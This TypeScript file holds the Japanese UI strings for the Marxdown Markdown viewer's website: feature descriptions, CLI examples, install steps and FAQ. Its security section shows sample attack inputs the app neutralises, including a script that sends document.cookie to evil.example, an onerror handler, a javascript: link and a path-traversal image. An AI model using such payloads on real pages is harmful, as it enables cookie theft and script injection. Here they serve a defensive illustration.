/**
 * サイトの文言（日本語）。表記はアプリの UI の文言の取り決めに合わせる（フォルダー・タスクトレイ・外観 / 配色 など）。
 *
 * 英語版（`en.ts`）はこのオブジェクトと同じ形でなければならない（`Messages` 型で検査する）。
 */
export const ja = {
  meta: {
    siteName: 'Marxdown',
    title: 'Marxdown — Windows 向けの軽快な Markdown ビューアー',
    description:
      'Marxdown は、Markdown を読むことを中心に設計した Windows 向けのビューアー／エディターです。.md をすぐに開いて快適に読み、必要になったらそのまま編集できます。無料のオープンソースです。',
    guideSuffix: 'Marxdown ガイド',
    imageAlt:
      'Marxdown のロゴと「Markdown を読むために、VS Code を開きたくない。」の文字。右に、設計書を表示している Marxdown の画面がある',
  },

  nav: {
    skip: '本文へ移動',
    features: '特徴',
    faq: 'よくある質問',
    guide: 'ガイド',
    download: 'ダウンロード',
    github: 'GitHub',
    menu: 'メニュー',
    search: 'ガイドを検索',
    appearance: '外観',
    appearanceOptions: { system: 'システム', light: 'ライト', dark: 'ダーク' },
    language: '言語',
  },

  hero: {
    badge: (version: string) => `v${version} を公開しました`,
    badgeLink: '変更履歴',
    titleLines: ['Markdown を読むために、', '*VS Code を開きたくない。*'],
    lead: 'Markdown を読むことを中心に設計した、Windows 向けのビューアー／エディター。{command} で開いて、必要になったらそのまま編集できます。',
    leadCommand: 'marxdown README.md',
    download: 'Windows 版をダウンロード',
    downloadMeta: (version: string) => `v${version} · Windows 10 / 11（x64）· 無料・オープンソース`,
    github: 'GitHub を見る',
    replay: 'もう一度再生',
    terminalTitle: 'Windows PowerShell',
    prompt: 'PS C:\\work\\sync\\docs>',
    commands: ['marxdown architecture.md', 'marxdown research.md'],
  },

  statement: {
    eyebrow: 'こんなこと、ありませんか',
    // 強調する語は `*` で囲む。スクロールに合わせて前から順に明るくなる。
    lines: [
      'AI が書いた*設計書*。リポジトリの *README*。*議事録*。',
      'Markdown を「ちょっと読みたい」場面は、1 日に何十回もあります。',
      'そのたびに、IDE が立ち上がるのを待っていませんか。',
    ],
    closing: 'Marxdown は、開いて・読んで・必要なら少し直すためのアプリです。',
  },

  different: {
    eyebrow: 'VS Code との関係',
    title: 'VS Code は素晴らしい。Marxdown は役割が違う。',
    body: 'VS Code は強力な開発環境です。Marxdown は、開発環境までは要らない場面のためにあります。コードを書くのは VS Code、それについて書かれたものを読むのは Marxdown。そういう併用を想定しています。',
    columns: [
      {
        name: 'VS Code',
        role: 'コードを書くための開発環境',
        points: [
          'ワークスペースと拡張機能を読み込んで始まる',
          'Markdown はソースとして開き、プレビューは別に開く',
          '書く・動かす・直すための道具がそろっている',
        ],
      },
      {
        name: 'Marxdown',
        role: 'Markdown を読むための場所',
        points: [
          'ファイル 1 つを、そのまま開く',
          '開くと、読むための表示になる',
          '直すときは、同じ Monaco エディターに切り替える',
        ],
      },
    ],
  },

  speed: {
    eyebrow: '一瞬で開く',
    title: '開くたびに、待たされない。',
    body: 'フル IDE の初期化を待たずに、Markdown を開けます。一度起動するとタスクトレイで待機し、2 回目以降の marxdown は既存のウィンドウにタブで開きます。コマンドを打ったターミナルのプロンプトも、すぐに戻ります。',
    stats: [
      { value: '600', unit: 'ms', label: '初回の起動（目標）' },
      { value: '120', unit: 'ms', label: '2 回目以降（目標）' },
      { value: '≈0', unit: '%', label: '待機中の CPU 使用率' },
    ],
    note: '起動時間は、release ビルドで起動の各段階の中央値を計測して確かめている設計上の目標値です。PC の性能によって変わります。',
    tray: 'タスクトレイで待機中',
    tabNote: '既存のウィンドウにタブで開く',
  },

  tour: {
    eyebrow: '使う場面',
    title: '読む。必要なら、そのまま直す。',
    steps: [
      {
        id: 'read',
        label: '読む',
        title: 'AI から長い設計書が届いた',
        body: 'Marxdown で開けば、読むための表示になります。余白・行間・本文幅を整えた文字組みで、表・コード・数式・図もそのまま表示します。',
        chips: [
          '表',
          'シンタックスハイライト',
          '数式（KaTeX）',
          '図（Mermaid）',
          'GitHub のアラート',
          'タスクリスト',
          '脚注',
        ],
      },
      {
        id: 'write',
        label: '書く',
        title: '直したいところを見つけた',
        body: 'キー 1 つで Split に切り替わり、その場で直せます。エディターは VS Code と同じ Monaco で、書いた内容は隣のプレビューにすぐ反映されます。',
        chips: [],
      },
      {
        id: 'format',
        label: '整える',
        title: '表の列がそろっていない',
        body: '崩れた表の列幅は、Shift+Alt+F で揃います。太字・リンク・見出し・リストも、ショートカットで付け外しできます。',
        chips: [],
      },
      {
        id: 'find',
        label: '探す',
        title: 'フォルダーごと目を通したい',
        body: 'marxdown docs/ で、フォルダー内のファイル一覧と一緒に開きます。Ctrl+P で名前の一部から探せて、Ctrl+Shift+P のコマンドパレットからはすべての操作を実行できます。',
        chips: [],
      },
    ],
    keys: {
      split: 'Split',
      bold: '太字',
      align: '表の列幅を揃える',
      quickOpen: 'ファイルへ移動',
      commandPalette: 'コマンドパレット',
    },
    quickOpenPlaceholder: 'ファイル名を入力',
    quickOpenQuery: 'cache',
  },

  ai: {
    eyebrow: 'AI 時代の Markdown',
    title: 'AI が書いた Markdown を、読む場所に。',
    body: 'AI に設計、調査、議事録、レビューを頼むと、Markdown が返ってくることが増えました。書く時間より、読む時間のほうが長くなっています。Marxdown は、そうして増えていく Markdown を「読む」ための場所として使えます。',
    kinds: ['設計書', '調査メモ', '会議の要約', '実装計画', 'コードレビュー', 'プロジェクトのドキュメント'],
    points: [
      {
        title: '出力を、そのまま読む',
        body: 'コマンドの出力をパイプで渡すと、表やコードが整った文書として表示します。',
        command: 'llm "設計案を出して" | marxdown -',
      },
      {
        title: '書き込まれたフォルダーを見る',
        body: 'エージェントがファイルを書き換えると、開いている文書も自動で再読み込みします。',
        command: 'marxdown docs/',
      },
      {
        title: '自分で書いていない文書も',
        body: '文書に埋め込まれたスクリプトは実行しません。フォルダーの外のファイルは、許可しない限り読み込みません。',
        command: '',
      },
    ],
  },

  themes: {
    eyebrow: '自分好みに',
    title: '50 の配色から、しっくりくる 1 枚を。',
    body: 'ライトとダークの切り替えに加えて、組み込みの配色が 50 種類。プレビューとエディターで別々に選べます。CSS ファイルを置けば、自分の配色も追加できます。',
    scheme: '外観',
    schemeLight: 'ライト',
    schemeDark: 'ダーク',
    current: '選択中の配色',
    custom: 'themes フォルダーに CSS を置くだけ',
    defaultName: 'Marxdown',
  },

  typography: {
    eyebrow: '読みやすさ',
    title: '何十分も読むから、文字組みにこだわる。',
    body: 'Markdown は、一瞬見るだけではなく、何分、何十分と読むことがあります。だから、本文とコードのフォント、文字サイズ、行間、本文幅、表の罫線を調整できるようにしています。変更はすぐにプレビューへ反映されます。',
    fontSize: '文字サイズ',
    lineHeight: '行間',
    maxWidth: '本文幅',
    tableStyle: '表の罫線',
    tableStyles: { lines: '横罫線のみ', grid: '格子', zebra: '縞模様' },
    font: 'フォント',
    fonts: { sans: 'ゴシック', serif: '明朝' },
    reset: '既定に戻す',
  },

  bytes: {
    eyebrow: '安心して保存',
    title: '編集していない箇所は、1 バイトも変わらない。',
    body: '保存しても、手を入れていない行はそのままです。改行コード・BOM・末尾の改行も、開いたときのまま保ちます。ほかのアプリがファイルを書き換えたときは、自動で再読み込みします。',
    chips: ['BOM 付き UTF-8 のまま', 'CRLF のまま', '末尾の改行もそのまま'],
    changed: '変わったバイト',
    total: 'ファイル全体',
    unit: 'バイト',
    before: '保存前',
    after: '保存後',
    edit: { from: '5', to: '3' },
  },

  security: {
    eyebrow: '知らないファイルも',
    title: '自分で書いていない Markdown も、安心して開ける。',
    body: 'LLM が生成したファイルのように、自分で書いていない Markdown を開くことを前提に作っています。何重もの防御で、文書の中身がアプリやパソコンに手を出せないようにしています。',
    file: 'untrusted.md',
    threats: [
      {
        code: '<script>fetch("https://evil.example/?" + document.cookie)</script>',
        verdict: '埋め込まれたスクリプトは実行しない',
      },
      { code: '<img src="x" onerror="alert(1)">', verdict: 'onerror などのイベント属性は取り除く' },
      { code: '[続きを読む](javascript:alert(1))', verdict: '知らない種類のリンクは何もしない' },
      { code: '![](../../Pictures/private.png)', verdict: 'フォルダーの外は、許可しない限り読み込まない' },
    ],
    layers: ['CSP', 'サニタイズ', 'リンクの許可リスト', '読み込む範囲の検証'],
    blocked: '止めました',
    safe: '安全に表示',
  },

  features: {
    eyebrow: 'ほかにも',
    title: 'あると助かる機能も、ひととおり。',
    items: [
      {
        icon: 'outline',
        title: 'アウトライン',
        body: '見出しの一覧から、読みたい場所へ移動できます。',
        keys: 'Ctrl+Shift+U',
      },
      { icon: 'search', title: 'プレビュー内検索', body: '表示している文書の中を検索できます。', keys: 'Ctrl+F' },
      {
        icon: 'slides',
        title: 'Marp のスライド',
        body: 'marp: true を書いた文書は、スライドとして表示します。',
        keys: '',
      },
      {
        icon: 'export',
        title: 'HTML / PDF に書き出し',
        body: '表示している文書を、そのまま HTML や PDF にできます。',
        keys: '',
      },
      {
        icon: 'reload',
        title: '自動で再読み込み',
        body: 'ほかのアプリがファイルを書き換えると、自動で再読み込みします。',
        keys: '',
      },
      {
        icon: 'files',
        title: 'ファイル操作',
        body: 'ファイル一覧から、新規作成・名前の変更・コピー・ごみ箱への移動ができます。',
        keys: '',
      },
      {
        icon: 'pipe',
        title: '標準入力から開く',
        body: 'コマンドの出力を、そのまま無題の文書として開けます。',
        keys: '',
      },
      {
        icon: 'language',
        title: '日本語と英語',
        body: '画面の表示は日本語と英語に対応しています。既定では Windows の表示言語に合わせます。',
        keys: '',
      },
      {
        icon: 'update',
        title: '自動更新',
        body: '新しいバージョンが出るとアプリ内でお知らせし、ボタン 1 つで入れ替わります。',
        keys: '',
      },
      {
        icon: 'folder',
        title: 'エクスプローラーから',
        body: '.md のダブルクリックでも、フォルダーの右クリックメニューからも開けます。',
        keys: '',
      },
    ],
  },

  cli: {
    eyebrow: 'ターミナルから',
    command: 'marxdown README.md',
    title: 'ワークスペースも、プロジェクトの設定も要らない。',
    body: 'いつものターミナルで打てば、すぐに読み始められます。cmd.exe / PowerShell / Git Bash のどこから実行しても、プロンプトはすぐに戻ります。',
    examples: [
      { command: 'marxdown README.md', description: 'ファイルを開く' },
      { command: 'marxdown README.md CHANGELOG.md', description: '複数のファイルをまとめて開く' },
      { command: 'marxdown docs/', description: 'フォルダーを開く' },
      { command: 'marxdown -m split notes.md', description: '表示モードを指定して開く' },
      { command: 'llm "設計案を出して" | marxdown -', description: '標準入力の内容を無題の文書として開く' },
    ],
    copy: 'コピー',
    copied: 'コピーしました',
  },

  install: {
    eyebrow: 'はじめる',
    title: 'ダウンロードして、実行して、.md を開く。',
    steps: [
      {
        title: 'ダウンロード',
        body: 'Releases から Marxdown_<バージョン>_x64-setup.exe をダウンロードします。',
      },
      {
        title: 'インストール',
        body: '実行するだけです。管理者権限は不要です。最後の確認で「はい」を選ぶと、marxdown コマンドが使えるようになります。',
      },
      {
        title: '.md を開く',
        body: '.md をダブルクリックするか、ターミナルで marxdown README.md と入力します。',
      },
    ],
    smartScreen:
      'インストーラーには現在コード署名をしていないため、SmartScreen の警告が表示されることがあります。「詳細情報」→「実行」の順に選ぶと、インストールを続けられます。',
    requirements:
      '動作環境: Windows 10 / 11（x64）。WebView2 ランタイムが必要です（Windows 11 には標準で入っています）。',
    more: 'インストールの詳しい手順',
  },

  faq: {
    eyebrow: 'よくある質問',
    title: '気になりそうなこと。',
    items: [
      {
        question: 'Marxdown はエディターですか？',
        answer:
          'はい、編集もできます。ただし、Markdown を読むことを中心に設計しています。開くと読むための表示になり、キー 1 つで Split や Edit に切り替えて、VS Code と同じ Monaco エディターで編集できます。',
      },
      {
        question: 'VS Code で読むのと、何が違いますか？',
        answer:
          'VS Code は優れた開発環境で、Markdown のプレビューも備えています。Marxdown は、ワークスペースや拡張機能を読み込むほどではない場面で、Markdown をすぐに開いて読むためのアプリです。両方を使い分けることを想定しています。',
      },
      {
        question: 'オフラインで使えますか？',
        answer:
          'はい。Mermaid の図や数式を含め、表示の処理はすべて手元で行います。インターネットに接続するのは、更新を確認するときと、文書の中にある https:// の画像を表示するときです。',
      },
      {
        question: 'Markdown がどこかへアップロードされることはありますか？',
        answer:
          'ありません。アカウント登録も、利用状況の送信（テレメトリ）もありません。更新の確認では GitHub の Releases に問い合わせますが、開いているファイルの情報は含みません。この確認は設定で止められます。',
      },
      {
        question: '無料ですか？',
        answer: 'はい。MIT ライセンスのオープンソースで、仕事でも無料で使えます。',
      },
      {
        question: '対応している OS は？',
        answer: 'Windows 10 / 11（x64）です。macOS と Linux の版は、現在ありません。',
      },
      {
        question: 'インストール時に SmartScreen の警告が出ます。',
        answer:
          'インストーラーに現在コード署名をしていないためです。「詳細情報」→「実行」の順に選ぶと続けられます。インストーラーは、公開しているソースコードから GitHub Actions でビルドしています。',
      },
    ],
  },

  cta: {
    title: 'まずは 1 つ、.md を開いてみる。',
    body: '無料のオープンソースです。Windows 10 / 11 で、いますぐ試せます。',
    download: 'Windows 版をダウンロード',
    github: 'GitHub で見る',
  },

  footer: {
    tagline: 'Markdown を読むために、VS Code を開きたくない。',
    product: 'プロダクト',
    guide: 'ガイド',
    community: 'コミュニティ',
    features: '特徴',
    download: 'ダウンロード',
    changelog: '変更履歴',
    issues: '不具合の報告',
    ideas: '機能の提案',
    security: 'セキュリティ',
    source: 'ソースコード',
    license: 'MIT ライセンス',
  },

  guide: {
    title: 'ガイド',
    pages: {
      start: 'はじめに',
      shortcuts: 'キーボードショートカット',
      syntax: '記法',
      settings: '設定',
    },
    descriptions: {
      start:
        'インストール、コマンドラインからの使い方、ファイルの置き場所など、Marxdown を使いはじめるための情報です。',
      shortcuts: 'Marxdown のキーボードショートカットの一覧です。',
      syntax: 'Marxdown が表示できる Markdown の書き方です。左が書き方、右が表示です。',
      settings: '設定画面（Ctrl+,）と同じ並びで、すべての設定項目を説明します。',
    },
    onThisPage: 'このページの内容',
    edit: 'このページの元になったファイル',
    prev: '前へ',
    next: '次へ',
    filter: '絞り込む',
    shortcutFilterPlaceholder: '操作やキーで絞り込む（例: 保存、Ctrl+P）',
    settingFilterPlaceholder: '設定の名前やキーで絞り込む（例: 行間、editor.fontSize）',
    noMatch: '該当する項目はありません',
    source: '書き方',
    result: '表示',
    settingKey: 'キー',
    settingDefault: '既定',
    settingRange: '範囲',
    settingOptions: '選択肢',
    settingEmpty: '（空）',
    copyKey: 'キーをコピー',
    requiresSetting: '設定で有効にすると使えます',
    settingsIntro:
      '設定画面（Ctrl+,）と同じ並びで載せています。settings.json を直接編集するときは、各項目のキー（例: preview.fontSize）を使います。settings.json は、設定画面の「settings.json を開く」から開けます。',
    customThemes: {
      title: '自分の配色を追加する',
      body: [
        'themes フォルダーに置いた .css ファイル 1 つが 1 つの配色になり、設定の「配色」に表示されます。プレビューとエディターのどちらでも選べます。配色の名前は、拡張子を除いたファイル名です（英数字と - _ だけ使えます）。',
        'ファイルには、セレクターを付けずに宣言だけを書きます。ライトとダークで色を変えるときは light-dark() を、一方にだけ対応する配色は color-scheme を使います。組み込みの配色と同じ名前を付けると、組み込みの配色の代わりに使われます。ファイルを保存すると、すぐに反映されます。',
      ],
      location: '置き場所',
      variables: '使える変数',
      groups: {
        surface: '背景',
        text: '文字',
        border: '罫線',
        accent: 'アクセント',
        code: 'コード',
      },
    },
    marpNote: 'スライドの見本',
  },

  palette: {
    placeholder: 'ガイドを検索',
    empty: '見つかりませんでした',
    hint: '↑↓ で選択 · Enter で移動 · Esc で閉じる',
    kinds: { page: 'ページ', shortcut: 'ショートカット', setting: '設定', syntax: '記法', section: '節' },
    open: 'ガイドを検索',
  },

  window: {
    mode: { preview: 'Preview', edit: 'Edit', split: 'Split' },
    encoding: 'UTF-8',
    eol: 'LF',
    chars: (count: number) => `${count.toLocaleString('ja-JP')} 文字`,
    minutes: (count: number) => `約 ${count} 分`,
    sync: 'スクロール同期: オン',
    untitled: '無題',
    explorer: 'エクスプローラー',
    outline: 'アウトライン',
  },
};

type Widen<T> = T extends string
  ? string
  : T extends (...args: infer A) => infer R
    ? (...args: A) => Widen<R>
    : T extends readonly (infer U)[]
      ? Widen<U>[]
      : T extends object
        ? { [K in keyof T]: Widen<T[K]> }
        : T;

/** 文言の形。日本語版から導出する。 */
export type Messages = Widen<typeof ja>;
